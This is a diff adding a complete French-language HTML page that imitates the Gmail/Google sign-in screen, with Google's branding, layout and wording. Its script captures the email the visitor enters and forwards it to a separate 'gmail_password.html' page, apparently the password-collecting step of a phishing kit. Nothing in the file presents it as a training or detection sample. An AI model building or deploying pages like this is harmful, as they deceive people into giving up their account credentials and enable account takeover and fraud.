@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background: white;
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 16px 32px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .gmail-logo {
+            font-size: 22px;
+            color: #5f6368;
+            font-weight: 400;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 448px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+        }
+
+        .google-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .google-logo span {
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+
+        .info-text {
+            color: #5f6368;
+            font-size: 14px;
+            margin: 32px 0;
+            line-height: 1.5;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .next-btn:hover {
+            background: #1669d6;
+        }
+
+        .footer {
+            padding: 24px 32px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #5f6368;
+            background: #f8f9fa;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .language-select {
+            border: 1px solid #dadce0;
+            background: white;
+            color: #5f6368;
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        .help-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .help-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 32px 24px;
+                margin: 20px;
+                border: none;
+            }
+            
+            .header {
+                padding: 16px 20px;
+            }
+            
+            .footer {
+                padding: 20px;
+                flex-direction: column;
+                gap: 16px;
+                text-align: center;
+            }
+            
+            .help-links {
+                gap: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="gmail-logo">Gmail</div>
+    </div>
+
+    <div class="main-content">
+        <div class="login-container">
+            <div class="google-logo">
+                <span>Se connecter</span>
+            </div>
+            
+            <div class="title">Utiliser votre compte Google</div>
+            <div class="subtitle" id="userEmail"></div>
+            
+            <form id="emailForm">
+                <div class="form-group">
+                    <input type="email" class="input-field" id="email" placeholder="Adresse e-mail ou numéro de tel" required autofocus>
+                </div>
+                
+                <div class="info-text">
+                    Vous n'avez pas votre téléphone ? <a href="#" class="forgot-email">Utilisez votre adresse e-mail à la place</a>
+                </div>
+                
+                <div class="button-group">
+                    <a href="#" class="create-account">Créer un compte</a>
+                    <button type="submit" class="next-btn">Suivant</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div>
+            <select class="language-select">
+                <option>Français</option>
+                <option>English</option>
+                <option>Español</option>
+                <option>Deutsch</option>
+            </select>
+        </div>
+        <div class="help-links">
+            <a href="#">Aide</a>
+            <a href="#">Confidentialité</a>
+            <a href="#">Conditions</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            
+            if (!email) {
+                return;
+            }
+            
+            // Redirection correcte vers la page mot de passe
+            window.location.href = `gmail_password.html?email=${encodeURIComponent(email)}`;
+        });
+
+        // Focus automatique sur le champ email
+        document.getElementById('email').focus();
+    </script>
+</body>
+</html>
